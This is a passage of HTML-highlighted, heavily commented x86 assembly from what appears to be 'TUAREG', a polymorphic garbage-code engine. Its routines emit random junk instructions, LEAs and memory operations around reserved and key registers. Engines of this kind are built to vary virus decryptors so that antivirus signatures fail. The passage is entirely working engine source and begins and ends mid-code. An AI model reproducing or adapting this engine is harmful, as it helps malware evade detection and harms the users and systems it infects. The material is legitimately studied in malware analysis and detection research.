    </span><span class="sc5">@@GWV_AL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; If the register was AL, we add 4 to the opcode</span><span class="sc0">
                              </span><span class="sc1">; in AL to make OP AL,Value8. If the register</span><span class="sc0">
                              </span><span class="sc1">; was EAX, we add 5 to the opcode in AL to make</span><span class="sc0">
                              </span><span class="sc1">; OP EAX,Value32</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">         </span><span class="sc1">; We store the opcode</span><span class="sc0">
     </span><span class="sc5">@@GWV_02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc1">; Get a random number in EAX</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Restore flags to know wether to use 8 bits</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Store32</span><span class="sc0"> </span><span class="sc1">; or 32 bits to complete the instruction</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Store32</span><span class="sc0">
     </span><span class="sc5">@@Store8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store a random byte to complete</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">  </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@Store32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">; Store a random dword to complete</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">  </span><span class="sc1">; Return</span><span class="sc0">

 </span><span class="sc1">;; This part is similar to GeneralWithValue, but this time we use a random</span><span class="sc0">
 </span><span class="sc1">;; register as source of operation, not a value.</span><span class="sc0">
 </span><span class="sc5">@@GeneralWithReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GWR_32b</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@GWR_32b</span><span class="sc0">  </span><span class="sc1">; Select 32 bits instructions with a 75% of</span><span class="sc0">
                                 </span><span class="sc1">; probability</span><span class="sc0">
     </span><span class="sc5">@@GWR_8b</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAReg8</span><span class="sc0"> </span><span class="sc1">; Select a 8 bit register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; Can we select them?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">      </span><span class="sc1">; If not, we select another type of garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Save it in DL</span><span class="sc0">
     </span><span class="sc5">@@GWR8_02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAReg8</span><span class="sc0"> </span><span class="sc1">; Select another Reg8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Save it in DH</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Are they the same register?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GWR8_01</span><span class="sc0">    </span><span class="sc1">; If not, jump and use a random operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Jump to select another Reg8 with a 50%</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GWR8_02</span><span class="sc0">     </span><span class="sc1">; of probability</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">; Since the registers are equal, we select</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">    </span><span class="sc1">; a more reliable instruction (XOR or SUB)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GWR8_04</span><span class="sc0">    </span><span class="sc1">; Jump to continue with this opcode</span><span class="sc0">
     </span><span class="sc5">@@GWR8_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
     </span><span class="sc5">@@GWR8_04</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">    </span><span class="sc1">; Get a random operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">    </span><span class="sc1">; Check if it's CMP</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GWR8_03</span><span class="sc0">    </span><span class="sc1">; If it isn't jump</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; Is that register "touched"?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">      </span><span class="sc1">; If it is, select other type of garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">   </span><span class="sc1">; MOV instead of CMP</span><span class="sc0">
     </span><span class="sc5">@@GWR8_03</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">    </span><span class="sc1">; Put it in AL</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GWR_04</span><span class="sc0">    </span><span class="sc1">; Jump to make the instruction</span><span class="sc0">

     </span><span class="sc5">@@GWR_32b</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Select an initialized not-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; reserved register and save it in DL</span><span class="sc0">
    </span><span class="sc5">@@GWR32_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Get any initialized regis-</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; ter and compare it with the selected before</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GWR_03</span><span class="sc0">  </span><span class="sc1">; If it's different, jump</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; If it's equal, repeat the register ob-</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GWR32_01</span><span class="sc0">    </span><span class="sc1">; tention with a 50% of probability</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Save the register in DH</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">   </span><span class="sc1">; Select XOR or SUB, which are the most re-</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; liable instructions that can be used with</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">  </span><span class="sc1">; the same source and operand register</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GWR_05</span><span class="sc0">   </span><span class="sc1">; Jump and continue</span><span class="sc0">
     </span><span class="sc5">@@GWR_03</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Save the register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
     </span><span class="sc5">@@GWR_05</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">  </span><span class="sc1">; Get a random operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">  </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GWR_02</span><span class="sc0">   </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; Is the register "touched"?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">    </span><span class="sc1">; If it is, avoid MOV (and select another</span><span class="sc0">
                                 </span><span class="sc1">; type of garbage)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">   </span><span class="sc1">; MOV instead of CMP</span><span class="sc0">
      </span><span class="sc5">@@GWR_02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">    </span><span class="sc1">; Put the opcode in AL</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Make it "32 bits"</span><span class="sc0">
      </span><span class="sc5">@@GWR_04</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">  </span><span class="sc1">; 2nd opcode as "register usage"</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Get alternate?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GWR_01</span><span class="sc0">    </span><span class="sc1">; Jump if not</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; Add 2 to the opcode...</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; ...and exchange source and destiny</span><span class="sc0">
      </span><span class="sc5">@@GWR_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">    </span><span class="sc1">; Set the registers in the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">    </span><span class="sc1">; Return</span><span class="sc0">

 </span><span class="sc1">;; Here we make various types of "difficult" garbage. In this part of the</span><span class="sc0">
 </span><span class="sc1">;; function we construct CALLs, conditional jumps, memory read/writes or</span><span class="sc0">
 </span><span class="sc1">;; LEAs with complicated sources.</span><span class="sc0">
 </span><span class="sc5">@@NotEasyOnes</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RecursiveOnes</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MemoryOperation</span><span class="sc0">

   </span><span class="sc1">;; Here we construct a LEA</span><span class="sc0">
   </span><span class="sc5">@@LEA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; Get a not-reserved register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Check if the register is "touched"</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">      </span><span class="sc1">; If it is, select other type of garbage</span><span class="sc0">
      </span><span class="sc5">@@LEA_00</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">   </span><span class="sc1">; Get a type of LEA</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA_00</span><span class="sc0">   </span><span class="sc1">; AL=0: Repeat random getting</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">   </span><span class="sc1">; AL=1: LEA Reg,[Direct_Value]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OneReg</span><span class="sc0">   </span><span class="sc1">; AL=2: LEA Reg,[Reg+Value]</span><span class="sc0">

    </span><span class="sc1">;; Here we make: LEA Reg,[(X*)Reg+Reg+Value]</span><span class="sc0">
     </span><span class="sc5">@@TwoRegs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">848Dh</span><span class="sc0"> </span><span class="sc1">; LEA with three opcodes</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store the first two bytes of the opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">    </span><span class="sc1">; Get a random byte</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">             </span><span class="sc1">; Store it to get a completely random index</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">    </span><span class="sc1">; Get a random addition</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">    </span><span class="sc1">; Return</span><span class="sc0">

     </span><span class="sc1">;; Here we make: LEA Reg,[Reg+Value]</span><span class="sc0">
      </span><span class="sc5">@@OneReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OneReg</span><span class="sc0">    </span><span class="sc1">; Random register (not ESP) for source</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Set dword addition</span><span class="sc0">
      </span><span class="sc5">@@LEA_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc0">   </span><span class="sc1">; Main opcode of LEA</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">             </span><span class="sc1">; Store a random addition</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">    </span><span class="sc1">; Return</span><span class="sc0">

     </span><span class="sc1">;; Here we make: LEA Reg,[Value]</span><span class="sc0">
      </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">   </span><span class="sc1">; Put this special opcode (direct value)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LEA_01</span><span class="sc0">    </span><span class="sc1">; Jump to complete the instruction</span><span class="sc0">

</span><span class="sc5">@@MemoryRead</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; This variable signalizes a memory read or a me-</span><span class="sc0">
                            </span><span class="sc1">; mory write in the code below</span><span class="sc0">
</span><span class="sc5">@@Memo32bits</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; This variable indicates if a 32 bits read/write</span><span class="sc0">
                            </span><span class="sc1">; is made, or we are doing a 8 bits one</span><span class="sc0">

 </span><span class="sc1">;; Here we make a memory operation. We can make a read or write, and it can</span><span class="sc0">
 </span><span class="sc1">;; be indexed, using the Key register, since it's the only one that doesn't</span><span class="sc0">
 </span><span class="sc1">;; change its value (at least in this version of the TUAREG).</span><span class="sc0">
 </span><span class="sc1">;; We have to be sure that the used memory addresses exist (even reads), due</span><span class="sc0">
 </span><span class="sc1">;; to the fact that it's protected mode and the memory addresses are 32 bits,</span><span class="sc0">
 </span><span class="sc1">;; not like DOS where we can read from anywhere.</span><span class="sc0">
 </span><span class="sc5">@@MemoryOperation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Get a random AX being 0000h, 0001h, 0100h or</span><span class="sc0">
                </span><span class="sc6">sets</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc0">   </span><span class="sc1">; 0101h, to set @@MemoryRead and @@Memo32bits</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@MemoryRead</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; with random 0 or 1</span><span class="sc0">
                           </span><span class="sc1">; and use them to construct the garbage instruction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnAddressLow</span><span class="sc0"> </span><span class="sc1">; Get a random read/writing address</span><span class="sc0">
                                        </span><span class="sc1">; in EBX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Randomly, select the type of instruction</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WithReg</span><span class="sc0">  </span><span class="sc1">; If ZF, make a read/write with a reg</span><span class="sc0">

     </span><span class="sc1">;; Make: OP [Memory_Address],Value</span><span class="sc0">
     </span><span class="sc5">@@MW_WithValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">    </span><span class="sc1">; Get a random operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">    </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WV_MOV</span><span class="sc0">  </span><span class="sc1">; Then, do MOV</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">    </span><span class="sc1">; Set main opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MW_Continue01</span><span class="sc0"> </span><span class="sc1">; Jump</span><span class="sc0">
  </span><span class="sc5">@@MW_WV_MOV</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00C6h</span><span class="sc0">     </span><span class="sc1">; C6 = Opcode of MOV</span><span class="sc0">
     </span><span class="sc5">@@MW_Continue01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">   </span><span class="sc1">; Indexed?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WV_NotIndexed</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MW_WV_NotIndexed</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@MW_WV_Indexed</span><span class="sc0">
                </span><span class="sc6">jp</span><span class="sc0">    </span><span class="sc5">@@MW_WV_NotIndexed</span><span class="sc0">
          </span><span class="sc1">; Select indexed with a (12.5%+6.25%) of probability</span><span class="sc0">
   </span><span class="sc1">;; This is the indexed one. We can do OP Reg,[Reg2+Value] (or the reverse)</span><span class="sc0">
       </span><span class="sc5">@@MW_WV_Indexed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@MW_WV_NotIndexed</span><span class="sc0">    </span><span class="sc1">; If it isn't set yet, then make a</span><span class="sc0">
                                            </span><span class="sc1">; not indexed operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WV_NotThird</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MW_WV_NotThird</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">; Activate third opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WV_Mult_32b</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MW_WV_Mult_8b</span><span class="sc0">
       </span><span class="sc5">@@MW_WV_Mult_32b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc5">@@MW_WV_Mult_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc5">@@MW_WV_RepeatMult</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MW_WV_RepeatMult</span><span class="sc0">
